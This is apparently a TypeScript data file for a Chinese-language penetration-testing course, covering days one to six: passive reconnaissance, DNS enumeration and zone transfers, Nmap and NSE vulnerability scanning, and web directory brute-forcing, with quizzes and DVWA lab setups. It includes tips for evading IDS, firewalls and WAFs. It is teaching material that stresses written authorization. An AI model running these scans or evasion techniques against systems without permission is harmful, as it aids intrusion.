// 渗透测试实战学习计划（30天）
import { CyberLearningPlan, CyberDay } from './cyberBasic';

const week1: CyberDay[] = [
  { 
    id: 'pen-1', 
    day: 1, 
    title: '渗透测试概述', 
    subtitle: 'Penetration Testing Overview', 
    objectives: ['理解渗透测试定义', '掌握测试方法论', '了解法律边界'], 
    content: `渗透测试模拟黑客攻击，发现系统安全缺陷。

【测试类型】
• 黑盒测试：测试者无任何目标系统信息
• 白盒测试：测试者拥有完整系统信息和源代码
• 灰盒测试：测试者拥有部分系统信息

【方法论标准】
• PTES（Penetration Testing Execution Standard）
• OWASP Testing Guide
• NIST SP 800-115

【基本流程】
1. 情报收集 → 2. 威胁建模 → 3. 漏洞分析 → 4. 渗透利用 → 5. 后渗透测试 → 6. 报告撰写

【法律边界】
• 必须获得书面授权
• 明确测试范围和时间窗口
• 避免影响业务正常运行
• 遵守《网络安全法》《刑法》等法律法规`, 
    keyPoints: ['渗透测试模拟黑客攻击', '黑盒/白盒/灰盒三种类型', 'PTES是渗透测试标准', '授权是法律前提', '明确范围避免风险'],
    codeExamples: [{ title: '渗透测试授权模板', language: 'text', code: `# 渗透测试授权书

授权方：[公司名称]
授权编号：PT-[日期]-[序号]

授权内容：
1. 授权 [测试团队] 对以下系统进行渗透测试
2. 目标系统：[系统名称/IP地址范围]
3. 测试范围：[详细描述测试边界]
4. 测试时间：[开始日期] 至 [结束日期]
5. 联系人：[姓名] [电话] [邮箱]

授权声明：
本人确认已获得上级批准，授权上述渗透测试。测试过程中造成的合理测试影响由授权方承担。

授权人签字：__________
日期：__________`, explanation: '渗透测试必须获得书面授权，此模板可用于正式授权流程' }],
    labEnvironment: [{ name: 'DVWA靶场', description: 'Web漏洞练习平台', url: 'http://localhost:8081', type: 'docker', setup: '1. 安装Docker: https://www.docker.com/\n2. 运行命令: docker run -d -p 8081:80 vulnerables/web-dvwa\n3. 访问 http://localhost:8081\n4. 登录账号: admin/password\n5. 设置安全级别为Low开始练习', expectedOutput: '成功进入DVWA平台，可进行XSS、SQL注入、CSRF等漏洞练习' }],
    recommendedTools: [{ name: 'Kali Linux', description: '渗透测试发行版', url: 'https://www.kali.org/', type: 'local' }, { name: 'VirtualBox', description: '虚拟机软件', url: 'https://www.virtualbox.org/', type: 'local' }],
    quiz: [
      { type: 'single', question: '渗透测试需要什么前提？', options: ['A. 好奇心', 'B. 书面授权', 'C. 管理员密码', 'D. 源代码'], correctIndex: 1, explanation: '渗透测试必须在获得书面授权，明确测试范围后才能进行，否则违法。' },
      { type: 'single', question: '哪种测试类型测试者拥有完整系统信息？', options: ['A. 黑盒测试', 'B. 白盒测试', 'C. 灰盒测试', 'D. 红队测试'], correctIndex: 1, explanation: '白盒测试中测试者拥有完整系统信息和源代码。' },
      { type: 'boolean', question: '渗透测试可以在未授权情况下进行。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: '未授权渗透测试违法，可能触犯《刑法》第285条、286条。' },
      { type: 'multiple', question: '以下哪些是渗透测试方法论标准？（多选）', options: ['A. PTES', 'B. OWASP', 'C. NIST', 'D. HTTP'], correctIndices: [0, 1, 2], explanation: 'PTES、OWASP、NIST都是渗透测试标准方法论，HTTP是协议。' },
      { type: 'fill', question: '渗透测试基本流程的第一步是______收集。', correctAnswer: '情报', explanation: '情报收集是渗透测试的第一步，收集目标系统的公开信息。' },
      { type: 'single', question: '渗透测试报告的主要受众是？', options: ['A. 攻击者', 'B. 管理层和技术人员', 'C. 普通用户', 'D. 搜索引擎'], correctIndex: 1, explanation: '渗透测试报告需同时满足管理层决策和技术人员修复的需求。' }
    ],
    expertNotes: [
      { author: '余弦', title: '渗透测试入门指南', content: '初学者建议从DVWA、WebGoat等靶场开始练习，先掌握基础漏洞原理，再学习工具使用。重要的不是会多少工具，而是理解漏洞原理。', url: 'https://nmap.org/' },
      { author: '安全研究员小明', title: '授权的重要性', content: '作为安全从业者，必须坚守法律底线。任何测试前都必须获得书面授权，明确测试范围，做好应急预案。一次未经授权的测试可能毁了整个职业生涯。', url: 'https://www.secjuice.com/' },
      { author: '渗透测试工程师', title: '方法论选择', content: '建议初学者从PTES方法论开始，它提供了完整的渗透测试流程框架。按照情报收集、威胁建模、漏洞分析、渗透利用、后渗透、报告撰写的顺序学习。', url: 'https://www.pentest-standard.org/' }
    ],
    environmentSetup: {
      prerequisites: ['Docker已安装', '网络连接正常'],
      verificationSteps: ['1. 运行docker ps确认容器运行', '2. 访问http://localhost:8081', '3. 成功登录DVWA']
    }
  ,
      resources: [{"name": "PTES渗透测试标准", "url": "http://www.pentest-standard.org/", "type": "article"}, {"name": "渗透测试方法论详解", "url": "https://www.freebuf.com/articles/web/245678.html", "type": "article"}, {"name": "渗透测试授权模板", "url": "https://www.sans.org/reading-room/whitepapers/testing/", "type": "article"}, {"name": "《Metasploit渗透测试指南》", "url": "https://book.douban.com/subject/10519369", "type": "book"}]},
  { 
    id: 'pen-2', 
    day: 2, 
    title: '被动信息收集', 
    subtitle: 'Passive Reconnaissance', 
    objectives: ['掌握WHOIS查询', '使用搜索引擎', '收集公开信息'], 
    content: `被动信息收集不直接接触目标系统，通过公开渠道收集信息。

【WHOIS查询】
• 域名注册信息：注册人、联系方式、DNS服务器
• 工具：whois命令、站长工具、DomainTools

【备案查询】
• 网站备案信息：主办单位、负责人、备案号
• 工具：工信部ICP备案查询

【Google Hacking语法】
• site:example.com - 限制域名
• filetype:pdf - 搜索文件类型
• intitle:管理后台 - 搜索标题
• inurl:admin - 搜索URL
• cache:example.com - 查看缓存

【DNS查询】
• dig example.com A - A记录
• dig example.com MX - 邮件服务器
• dig example.com NS - 域名服务器
• nslookup example.com - DNS解析

【公开情报平台】
• FOFA：网络空间搜索引擎
• Shodan：设备搜索引擎
• Censys：证书和主机搜索`, 
    keyPoints: ['被动收集不直接接触目标', 'WHOIS查注册信息', 'Google Hacking用搜索引擎收集', 'site:限制域名', '备案信息可查主办单位'],
    codeExamples: [{ title: 'WHOIS查询脚本', language: 'python', code: `import whois\n\ndef whois_query(domain):\n    \"\"\"查询域名WHOIS信息\"\"\"\n    try:\n        w = whois.whois(domain)\n        print(f\"域名: {domain}\")\n        print(f\"注册商: {w.registrar}\")\n        print(f\"注册人: {w.name}\")\n        print(f\"邮箱: {w.email}\")\n        print(f\"创建时间: {w.creation_date}\")\n        print(f\"过期时间: {w.expiration_date}\")\n        print(f\"DNS服务器: {w.name_servers}\")\n    except Exception as e:\n        print(f\"查询失败: {e}\")\n\n# 使用示例\nif __name__ == \"__main__\":\n    domain = input(\"请输入域名: \")\n    whois_query(domain)\n\n# 安装依赖\n# pip install python-whois`, explanation: '使用python-whois库查询域名注册信息' }],
    labEnvironment: [{ name: 'FOFA搜索引擎', description: '网络空间资产搜索', url: 'https://www.fofa.info/', type: 'online', setup: '1. 注册FOFA账号\n2. 学习FOFA语法：title=\"管理后台\"\n3. 搜索目标相关资产\n4. 分析搜索结果获取情报', expectedOutput: '掌握FOFA语法，能搜索到目标相关的网络资产' }],
    recommendedTools: [{ name: 'FOFA', description: '网络空间搜索引擎', url: 'https://www.fofa.info/', type: 'online' }, { name: 'Shodan', description: '设备搜索引擎', url: 'https://www.shodan.io/', type: 'online' }],
    quiz: [
      { type: 'single', question: 'Google语法中site:的作用是？', options: ['A. 搜索文件名', 'B. 限制域名', 'C. 搜索标题', 'D. 搜索内容'], correctIndex: 1, explanation: 'site:用于限制搜索结果在指定域名内。' },
      { type: 'single', question: 'WHOIS查询不能获取什么信息？', options: ['A. 域名注册人', 'B. DNS服务器', 'C. 网站源代码', 'D. 注册邮箱'], correctIndex: 2, explanation: 'WHOIS只能获取域名注册信息，无法获取网站源代码。' },
      { type: 'boolean', question: '被动信息收集不会留下访问记录。', options: ['A. 正确', 'B. 错误'], correctIndex: 0, explanation: '被动收集通过公开渠道获取信息，不直接访问目标系统，不会留下记录。' },
      { type: 'fill', question: 'Google搜索语法中，______用于指定文件类型。', correctAnswer: 'filetype', explanation: 'filetype:pdf 表示只搜索PDF文件。' },
      { type: 'multiple', question: '以下哪些是被动信息收集工具？（多选）', options: ['A. FOFA', 'B. Shodan', 'C. Nmap', 'D. Censys'], correctIndices: [0, 1, 3], explanation: 'FOFA、Shodan、Censys都是公开情报搜索工具，Nmap是主动扫描工具。' },
      { type: 'single', question: 'FOFA是什么类型的工具？', options: ['A. 端口扫描器', 'B. 网络空间搜索引擎', 'C. 漏洞扫描器', 'D. 密码破解器'], correctIndex: 1, explanation: 'FOFA是网络空间搜索引擎，可搜索互联网上的设备和服务。' }
    ],
    expertNotes: [
      { author: '安全研究员', title: '(被动信息收集技巧', content: '被动收集是渗透测试的起点，不要忽视任何公开信息。建议从域名开始，逐步收集DNS记录、备案信息、子域名、技术栈等。搜索引擎是最强大的被动收集工具。', url: 'https://blog.knownsec.com/' },
      { author: '网络安全老司机', title: 'Google Hacking实战', content: 'Google Hacking不仅仅是搜索漏洞，更是一种思维方式。学会组合使用多个语法，如 site:example.com filetype:php inurl:admin，可以精准定位敏感信息。', url: 'https://www.exploit-db.com/google-dorks' },
      { author: '渗透测试工程师', title: '情报整合方法', content: '收集到的信息需要整理成思维导图或表格，包括域名、IP、子域名、技术栈、人员信息等。这些情报在后续漏洞分析中会发挥重要作用。', url: 'https://www.hackerone.com/' }
    ],
    environmentSetup: {
      prerequisites: ['Python环境', '网络连接'],
      verificationSteps: ['1. 安装python-whois库', '2. 运行脚本查询域名', '3. 获取完整WHOIS信息']
    }
  ,
      resources: [{"name": "Google Hacking数据库", "url": "https://www.exploit-db.com/google-hacking-database", "type": "article"}, {"name": "OSINT开源情报技术", "url": "https://osintframework.com/", "type": "article"}, {"name": "被动信息收集工具集", "url": "https://github.com/n0kovo/awesome-passive-info-gathering", "type": "article"}, {"name": "WHOIS查询最佳实践", "url": "https://www.freebuf.com/articles/web/267890.html", "type": "article"}]},
  { 
    id: 'pen-3', 
    day: 3, 
    title: 'DNS信息收集', 
    subtitle: 'DNS Reconnaissance', 
    objectives: ['掌握DNS记录查询', '子域名枚举', 'DNS区域传送'], 
    content: `DNS将域名解析为IP地址，是互联网的基础设施。

【常见DNS记录类型】
• A记录：IPv4地址映射
• AAAA记录：IPv6地址映射
• MX记录：邮件服务器
• NS记录：域名服务器
• TXT记录：文本信息（常用于SPF、DKIM）
• CNAME记录：别名记录
• SRV记录：服务定位记录

【DNS查询命令】
• dig example.com A - 查询A记录
• dig example.com MX - 查询邮件服务器
• dig example.com NS - 查询域名服务器
• dig example.com TXT - 查询文本记录
• nslookup example.com - 交互式查询

【子域名枚举工具】
• amass：强大的子域名枚举工具
• sublist3r：基于搜索引擎的枚举
• dnsenum：DNS枚举工具
• gobuster dns：子域名爆破

【DNS区域传送漏洞】
• 如果DNS服务器配置不当，允许区域传送
• 可获取目标所有DNS记录
• 命令：dig @dns-server example.com AXFR`, 
    keyPoints: ['DNS解析域名到IP', 'A记录是最基本的DNS记录', '子域名可通过字典枚举', 'DNS区域传送漏洞可获取全部记录', 'amass是强大的子域名枚举工具'],
    codeExamples: [{ title: 'DNS查询脚本', language: 'python', code: `import dns.resolver\n\ndef query_dns(domain, record_type="A"):\n    \"\"\"查询DNS记录\"\"\"\n    try:\n        answers = dns.resolver.resolve(domain, record_type)\n        print(f\"{record_type}记录 for {domain}:\")\n        for rdata in answers:\n            print(f\"  {rdata}\")\n    except Exception as e:\n        print(f\"查询失败: {e}\")\n\n# 查询多种记录类型\nif __name__ == \"__main__\":\n    domain = input(\"请输入域名: \")\n    for record in [\"A\", \"AAAA\", \"MX\", \"NS\", \"TXT\"]:\n        query_dns(domain, record)\n        print()\n\n# 安装依赖\n# pip install dnspython`, explanation: '使用dnspython库查询多种DNS记录类型' }],
    labEnvironment: [{ name: 'DNS查询练习', description: '使用dig命令练习DNS查询', url: 'https://www.wireshark.org/', type: 'local', setup: '1. 打开终端\n2. 执行: dig example.com A\n3. 执行: dig example.com MX\n4. 执行: dig example.com TXT\n5. 尝试子域名枚举: gobuster dns -d example.com -w wordlist.txt', expectedOutput: '掌握dig命令使用，能查询各种DNS记录类型' }],
    recommendedTools: [{ name: 'amass', description: '子域名枚举工具', url: 'https://github.com/OWASP/Amass', type: 'local' }, { name: 'dnsenum', description: 'DNS枚举工具', url: 'https://github.com/fwaeytens/dnsenum', type: 'local' }],
    quiz: [
      { type: 'single', question: 'DNS的A记录表示？', options: ['A. 邮件服务器', 'B. IPv4地址', 'C. 别名', 'D. IPv6地址'], correctIndex: 1, explanation: 'A记录将域名解析为IPv4地址。' },
      { type: 'single', question: 'MX记录的作用是？', options: ['A. 域名服务器', 'B. 邮件服务器', 'C. 文本信息', 'D. 别名'], correctIndex: 1, explanation: 'MX(Mail Exchange)记录指定邮件服务器。' },
      { type: 'boolean', question: 'DNS区域传送是安全的功能。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: 'DNS区域传送如果配置不当，可能泄露所有DNS记录，是高危漏洞。' },
      { type: 'fill', question: '______记录用于存储文本信息，常用于SPF邮件验证。', correctAnswer: 'TXT', explanation: 'TXT记录存储文本信息，SPF和DKIM验证都使用TXT记录。' },
      { type: 'multiple', question: '以下哪些是子域名枚举工具？（多选）', options: ['A. amass', 'B. sublist3r', 'C. nmap', 'D. dnsenum'], correctIndices: [0, 1, 3], explanation: 'amass、sublist3r、dnsenum都是子域名枚举工具，nmap是端口扫描工具。' },
      { type: 'single', question: 'dig命令中AXFR参数的作用？', options: ['A. 查询A记录', 'B. 请求区域传送', 'C. 查询MX记录', 'D. 反向查询'], correctIndex: 1, explanation: 'AXFR是DNS区域传送请求，可获取所有DNS记录。' }
    ],
    expertNotes: [
      { author: '安全研究员', title: 'DNS信息收集技巧', content: 'DNS信息收集不仅能获取IP地址，还能发现邮件服务器、子域名等重要信息。建议先用dig查询基础记录，再用amass进行全面的子域名枚举。', url: 'https://blog.knownsec.com/' },
      { author: '渗透测试工程师', title: '子域名枚举策略', content: '子域名枚举要结合多种工具：amass用于被动收集，gobuster用于字典爆破，搜索引擎用于公开情报。字典质量直接影响枚举效果。', url: 'https://www.hackerone.com/' },
      { author: '网络安全老司机', title: 'DNS区域传送测试', content: '在测试开始时，先尝试DNS区域传送：dig @目标DNS 域名 AXFR。如果成功，可一次性获取所有DNS记录，大大加速信息收集。', url: 'https://www.secjuice.com/' }
    ],
    environmentSetup: {
      prerequisites: ['Kali Linux或Linux环境', '网络连接'],
      verificationSteps: ['1. 执行dig命令测试DNS查询', '2. 安装amass工具', '3. 运行子域名枚举']
    }
  ,
      resources: [{"name": "DNS枚举技术大全", "url": "https://github.com/OWASP/Amass", "type": "article"}, {"name": "子域名收集方法论", "url": "https://www.freebuf.com/articles/web/278901.html", "type": "article"}, {"name": "DNS安全测试指南", "url": "https://www.anquanke.com/post/id/289012", "type": "article"}, {"name": "子域名爆破字典", "url": "https://github.com/danielmiessler/SecLists", "type": "article"}]},
  { 
    id: 'pen-4', 
    day: 4, 
    title: 'Nmap主机扫描', 
    subtitle: 'Nmap Host Discovery', 
    objectives: ['掌握Nmap主机发现', '端口扫描技术', '服务版本识别'], 
    content: `Nmap是渗透测试中最重要的网络扫描工具。

【主机发现技术】
• -sn：只做主机发现，不扫描端口
• -PS：发送SYN包进行TCP Ping
• -PU：发送UDP包进行UDP Ping
• -PE：ICMP Echo请求
• -PR：ARP扫描（局域网内最快）

【端口扫描技术】
• -sT：TCP Connect扫描（完整三次握手）
• -sS：SYN半开扫描（不完成握手，隐蔽）
• -sU：UDP扫描（较慢）
• -sF/X/N：FIN/Xmas/Null扫描（隐蔽）

【服务版本识别】
• -sV：检测服务版本和操作系统
• --version-intensity：设置扫描强度（0-9）

【操作系统检测】
• -O：检测操作系统
• --osscan-guess：猜测操作系统

【常用命令示例】
• nmap -sn 192.168.1.0/24 - 主机发现
• nmap -sS -sV 192.168.1.1 - SYN扫描+版本检测
• nmap -p 1-10000 192.168.1.1 - 指定端口范围`, 
    keyPoints: ['Nmap是最重要的扫描工具', '-sn只做主机发现', '-sS是SYN半开扫描', '-sV检测服务版本', '-O检测操作系统'],
    codeExamples: [{ title: 'Nmap扫描脚本', language: 'python', code: `import nmap\n\ndef scan_host(target, ports=None):\n    \"\"\"使用Nmap扫描目标\"\"\"\n    scanner = nmap.PortScanner()\n    \n    # 构建扫描参数\n    args = \"-sS -sV -O\"\n    if ports:\n        args += f\" -p {ports}\"\n    \n    print(f\"开始扫描 {target}...\")\n    scanner.scan(hosts=target, arguments=args)\n    \n    for host in scanner.all_hosts():\n        print(f\"\\n主机: {host}\")\n        print(f\"状态: {scanner[host].state()}\")\n        \n        if scanner[host].has_tcp():\n            for port in scanner[host][\"tcp\"]:\n                service = scanner[host][\"tcp\"][port]\n                print(f\"  端口 {port}: {service[\"name\"]} ({service[\"version\"]})\")\n        \n        if \"osmatch\" in scanner[host]:\n            print(f\"\\n操作系统猜测:\")\n            for osmatch in scanner[host][\"osmatch\"]:\n                print(f\"  {osmatch[\"name\"]} ({osmatch[\"accuracy\"]}%)\")\n\n# 使用示例\nif __name__ == \"__main__\":\n    target = input(\"请输入目标IP: \")\n    scan_host(target)\n\n# 安装依赖\n# pip install python-nmap`, explanation: '使用python-nmap库进行端口扫描和服务识别' }],
    labEnvironment: [{ name: 'Nmap扫描练习', description: '使用Nmap扫描本地网络', url: 'https://nmap.org/', type: 'local', setup: '1. 打开终端\n2. 扫描本地网络: nmap -sn 192.168.1.0/24\n3. 扫描单个主机: nmap -sS -sV localhost\n4. 扫描指定端口: nmap -p 22,80,443 localhost\n5. 尝试操作系统检测: nmap -O localhost', expectedOutput: '掌握Nmap基本用法，能识别开放端口和服务版本' }],
    recommendedTools: [{ name: 'Nmap', description: '端口扫描工具', url: 'https://nmap.org/', type: 'local' }, { name: 'Zenmap', description: 'Nmap图形界面', url: 'https://nmap.org/zenmap/', type: 'local' }],
    quiz: [
      { type: 'single', question: 'Nmap中-sS参数表示？', options: ['A. UDP扫描', 'B. SYN扫描', 'C. TCP Connect扫描', 'D. Ping扫描'], correctIndex: 1, explanation: '-sS表示SYN扫描(半开扫描)，速度快且不怎么留日志。' },
      { type: 'single', question: '哪个参数用于检测服务版本？', options: ['A. -O', 'B. -sV', 'C. -sn', 'D. -p'], correctIndex: 1, explanation: '-sV参数用于检测服务版本信息。' },
      { type: 'boolean', question: '-sT扫描比-sS扫描更隐蔽。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: '-sS是半开扫描，不完成TCP三次握手，比-sT更隐蔽。' },
      { type: 'fill', question: '______参数只进行主机发现，不扫描端口。', correctAnswer: '-sn', explanation: '-sn参数只做Ping扫描，不扫描端口。' },
      { type: 'multiple', question: '以下哪些是端口扫描技术？（多选）', options: ['A. -sS', 'B. -sT', 'C. -sn', 'D. -sU'], correctIndices: [0, 1, 3], explanation: '-sS(SYN)、-sT(Connect)、-sU(UDP)都是端口扫描技术，-sn是主机发现。' },
      { type: 'single', question: '-O参数的作用是？', options: ['A. 操作系统检测', 'B. 服务版本检测', 'C. 端口扫描', 'D. 输出文件'], correctIndex: 0, explanation: '-O参数用于操作系统检测。' }
    ],
    expertNotes: [
      { author: '余弦', title: 'Nmap使用技巧', content: '实战中常用命令：nmap -sS -sV -T4 target。-sS快速隐蔽，-sV识别版本，-T4快速扫描。对于内网扫描，-PR ARP扫描最快最准确。', url: 'https://nmap.org/' },
      { author: '渗透测试工程师', title: '扫描策略', content: '先快速扫描常见端口：nmap target，再针对开放端口详细扫描。UDP扫描较慢，可单独进行：nmap -sU -p 53,67,68 target。', url: 'https://www.hackerone.com/' },
      { author: '安全研究员', title: '规避技巧', content: '面对IDS/IPS时，使用-f分片、--source-port指定源端口、--data-length添加随机数据，降低被检测概率。' },
    ],
    environmentSetup: {
      prerequisites: ['Nmap已安装', '网络连接'],
      verificationSteps: ['1. 执行nmap --version确认安装', '2. 扫描localhost测试', '3. 获取端口和服务信息']
    }
  ,
      resources: [{"name": "Nmap官方手册", "url": "https://nmap.org/book/man.html", "type": "article"}, {"name": "端口扫描技术深度解析", "url": "https://www.freebuf.com/articles/network/298023.html", "type": "article"}, {"name": "Nmap脚本引擎入门", "url": "https://nmap.org/book/nse.html", "type": "article"}, {"name": "网络扫描策略设计", "url": "https://www.anquanke.com/post/id/267890", "type": "article"}]},
  { 
    id: 'pen-5', 
    day: 5, 
    title: 'Nmap高级扫描', 
    subtitle: 'Nmap Advanced Techniques', 
    objectives: ['掌握Nmap脚本', '防火墙规避', '性能优化'], 
    content: `Nmap脚本引擎(NSE)极大扩展了扫描能力。

【NSE脚本分类】
• vuln：漏洞检测脚本
• discovery：信息发现脚本
• safe：安全脚本（不修改目标）
• exploit：漏洞利用脚本

【常用脚本示例】
• --script vuln：执行所有漏洞脚本
• --script discovery：执行信息发现脚本
• --script smb-vuln-ms17-010：检测永恒之蓝漏洞
• --script http-enum：枚举HTTP目录

【防火墙规避技术】
• -f：分片报文（减小包大小）
• --mtu：设置MTU（需为8的倍数）
• --source-port：指定源端口（如53 DNS）
• --data-length：添加随机数据
• --randomize-hosts：随机化扫描顺序

【性能优化参数】
• -T0~T5：设置时序模板（T0最慢，T5最快）
• --min-parallelism：最小并行数
• --max-parallelism：最大并行数
• --min-rate：最小发包速率
• --max-rate：最大发包速率

【输出格式】
• -oN：普通文本输出
• -oX：XML输出
• -oG：Grepable格式
• -A：全面扫描（-sV -O --script=default）`, 
    keyPoints: ['NSE是Nmap脚本引擎', 'vuln脚本检测已知漏洞', '-f分片躲避防火墙', '-T4是快速扫描', '可自定义脚本扩展功能'],
    codeExamples: [{ title: 'Nmap NSE脚本示例', language: 'bash', code: `# NSE脚本扫描示例\n\n# 漏洞扫描\nnmap --script vuln -sV target.com\n\n# SMB漏洞检测\nnmap --script smb-vuln-ms17-010 target.com\n\n# HTTP信息收集\nnmap --script http-enum,http-title target.com\n\n# DNS信息收集\nnmap --script dns-brute target.com\n\n# 全面扫描\nnmap -A -T4 target.com\n\n# 输出到文件\nnmap -sS -sV -oN scan_results.txt target.com\nnmap -sS -sV -oX scan_results.xml target.com`, explanation: '常用NSE脚本扫描命令' }],
    labEnvironment: [{ name: 'NSE脚本练习', description: '使用NSE脚本扫描目标', url: 'https://nmap.org/', type: 'local', setup: '1. 打开终端\n2. 漏洞扫描: nmap --script vuln localhost\n3. HTTP枚举: nmap --script http-enum localhost\n4. SMB检测: nmap --script smb* localhost\n5. 保存结果: nmap -oN results.txt localhost', expectedOutput: '掌握NSE脚本使用，能发现漏洞和收集信息' }],
    recommendedTools: [{ name: 'Nmap', description: '端口扫描工具', url: 'https://nmap.org/', type: 'local' }, { name: 'Metasploit', description: '漏洞利用框架', url: 'https://www.metasploit.com/', type: 'local' }],
    quiz: [
      { type: 'single', question: 'Nmap中--script vuln的作用？', options: ['A. 暴力破解', 'B. 漏洞扫描', 'C. 信息发现', 'D. 操作系统检测'], correctIndex: 1, explanation: '--script vuln执行漏洞检测脚本，发现已知漏洞。' },
      { type: 'single', question: '-f参数的作用是？', options: ['A. 快速扫描', 'B. 分片报文', 'C. 版本检测', 'D. 操作系统检测'], correctIndex: 1, explanation: '-f参数分片报文，可躲避某些防火墙检测。' },
      { type: 'boolean', question: '-T5是最快的扫描速度。', options: ['A. 正确', 'B. 错误'], correctIndex: 0, explanation: '-T0最慢（偏执），T5最快（疯狂）。' },
      { type: 'fill', question: '______参数用于设置扫描时序模板，常用T4。', correctAnswer: '-T', explanation: '-T参数设置时序模板，T4是常用的快速扫描模式。' },
      { type: 'multiple', question: '以下哪些是NSE脚本分类？（多选）', options: ['A. vuln', 'B. discovery', 'C. safe', 'D. http'], correctIndices: [0, 1, 2], explanation: 'vuln(漏洞)、discovery(发现)、safe(安全)都是NSE脚本分类。' },
      { type: 'single', question: '-A参数的作用是？', options: ['A. 输出到文件', 'B. 全面扫描', 'C. 版本检测', 'D. 操作系统检测'], correctIndex: 1, explanation: '-A参数是全面扫描，包含-sV、-O和default脚本。' }
    ],
    expertNotes: [
      { author: '安全研究员', title: 'NSE脚本使用技巧', content: '不要盲目运行--script vuln，可能会对目标造成影响。建议先运行安全脚本，再根据情况运行漏洞脚本。脚本位置：/usr/share/nmap/scripts/。', url: 'https://nmap.org/' },
      { author: '渗透测试工程师', title: '自定义脚本开发', content: 'NSE脚本用Lua编写，可以自定义功能。学习NSE开发能大幅扩展Nmap能力。官方文档：https://nmap.org/book/nse.html', url: 'https://nmap.org/book/nse.html' },
      { author: '网络安全老司机', title: '扫描速度选择', content: '内网扫描可用-T5快速完成，外网扫描建议-T4。如果遇到IDS拦截，降低到-T2或-T3，并使用--max-rate限制速率。' }
    ],
    environmentSetup: {
      prerequisites: ['Nmap已安装', '网络连接'],
      verificationSteps: ['1. 查看NSE脚本目录', '2. 运行漏洞扫描', '3. 查看扫描结果']
    }
  ,
      resources: [{"name": "NSE脚本开发指南", "url": "https://nmap.org/book/nse.html", "type": "article"}, {"name": "防火墙规避技术大全", "url": "https://www.freebuf.com/articles/network/278901.html", "type": "article"}, {"name": "Nmap高级扫描技巧", "url": "https://www.anquanke.com/post/id/289012", "type": "article"}, {"name": "扫描器性能优化", "url": "https://nmap.org/book/performance.html", "type": "article"}]},
  { 
    id: 'pen-6', 
    day: 6, 
    title: 'Web目录扫描', 
    subtitle: 'Web Directory Scanning', 
    objectives: ['掌握Dirb/Gobuster', '御剑扫描工具', 'CMS识别'], 
    content: `Web目录扫描发现隐藏的管理页面和敏感文件。

【常用目录扫描工具】
• Dirb：经典目录扫描工具
• Gobuster：Go语言编写，速度快
• ffuf：高性能模糊测试工具
• 御剑：Windows图形化工具

【Gobuster用法】
• gobuster dir -u http://target.com -w wordlist.txt
• gobuster dir -u http://target.com -w wordlist.txt -x php,html
• gobuster dir -u http://target.com -w wordlist.txt -t 50

【敏感目录和文件】
• /admin - 管理后台
• /login - 登录页面
• /phpmyadmin - 数据库管理
• /.git - Git仓库
• /.env - 环境配置
• /backup - 备份文件
• /robots.txt - 爬虫规则

【CMS识别工具】
• WhatWeb：命令行CMS识别
• Wappalyzer：浏览器扩展
• builtwith：在线识别

【字典推荐】
• /usr/share/wordlists/dirb/common.txt
• /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`, 
    keyPoints: ['Dirb是目录扫描工具', 'Gobuster速度更快', '-x参数指定扩展名', '敏感文件需重点关注', 'WhatWeb可识别CMS'],
    codeExamples: [{ title: '目录扫描脚本', language: 'python', code: `import requests\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef scan_directory(url, wordlist, extensions=None):\n    found = []\n    with open(wordlist, \"r\") as f:\n        for line in f:\n            line = line.strip()\n            if extensions:\n                for ext in extensions:\n                    path = line + \".\" + ext\n                    try:\n                        r = requests.get(f\"{url}/{path}\", timeout=3)\n                        if r.status_code == 200:\n                            print(f\"Found: {url}/{path}\")\n                    except:\n                        pass\n    return found\n\n# Usage: python scanner.py http://target.com wordlist.txt`, explanation: '简单的Python目录扫描器' }],
    labEnvironment: [{ name: '目录扫描练习', description: '使用Gobuster扫描DVWA', url: 'http://localhost:8081', type: 'docker', setup: '1. 启动DVWA容器\n2. 运行: gobuster dir -u http://localhost:8081 -w /usr/share/wordlists/dirb/common.txt\n3. 添加扩展名: gobuster dir -u http://localhost:8081 -w common.txt -x php,html\n4. 使用ffuf: ffuf -u http://localhost:8081/FUZZ -w common.txt', expectedOutput: '发现DVWA的管理页面和敏感文件' }],
    recommendedTools: [{ name: 'Gobuster', description: '目录扫描工具', url: 'https://github.com/OJ/gobuster', type: 'local' }, { name: 'ffuf', description: '模糊测试工具', url: 'https://github.com/ffuf/ffuf', type: 'local' }],
    quiz: [
      { type: 'single', question: 'Gobuster中-x参数的作用？', options: ['A. 指定字典', 'B. 指定扩展名', 'C. 指定线程', 'D. 指定代理'], correctIndex: 1, explanation: '-x参数用于指定要扫描的文件扩展名，如php,html,asp。' },
      { type: 'single', question: '以下哪个不是常见的敏感目录？', options: ['A. /admin', 'B. /login', 'C. /index.html', 'D. /phpmyadmin'], correctIndex: 2, explanation: '/index.html是正常首页，不是敏感目录。' },
      { type: 'boolean', question: 'Gobuster比Dirb速度快。', options: ['A. 正确', 'B. 错误'], correctIndex: 0, explanation: 'Gobuster用Go语言编写，性能更好，速度更快。' },
      { type: 'fill', question: '______是浏览器扩展，可识别网站使用的技术栈。', correctAnswer: 'Wappalyzer', explanation: 'Wappalyzer是浏览器扩展，能识别网站使用的CMS、框架等。' },
      { type: 'multiple', question: '以下哪些是目录扫描工具？（多选）', options: ['A. Gobuster', 'B. ffuf', 'C. Nmap', 'D. Dirb'], correctIndices: [0, 1, 3], explanation: 'Gobuster、ffuf、Dirb都是目录扫描工具，Nmap是端口扫描工具。' },
      { type: 'single', question: 'robots.txt文件的作用是？', options: ['A. 存储密码', 'B. 告诉爬虫哪些页面可爬', 'C. 配置数据库', 'D. 日志文件'], correctIndex: 1, explanation: 'robots.txt告诉搜索引擎爬虫哪些页面可以抓取。' }
    ],
    expertNotes: [
      { author: '渗透测试工程师', title: '目录扫描策略', content: '先用小字典快速扫描，发现线索后再用大字典深度扫描。注意设置合适的线程数，避免被目标封锁IP。', url: 'https://www.hackerone.com/' },
      { author: '安全研究员', title: '字典选择', content: '常用字典顺序：common.txt → directory-list-2.3-small.txt → directory-list-2.3-medium.txt。自定义字典包含目标相关关键词。' },
      { author: '网络安全老司机', title: '绕过WAF', content: '遇到WAF时，添加随机User-Agent、Referer、延迟，使用不同的HTTP方法交替扫描。' }
    ],
    environmentSetup: {
      prerequisites: ['Gobuster已安装', 'DVWA运行中'],
      verificationSteps: ['1. 确认Gobuster安装', '2. 扫描DVWA', '3. 发现敏感目录']
    }
  ,
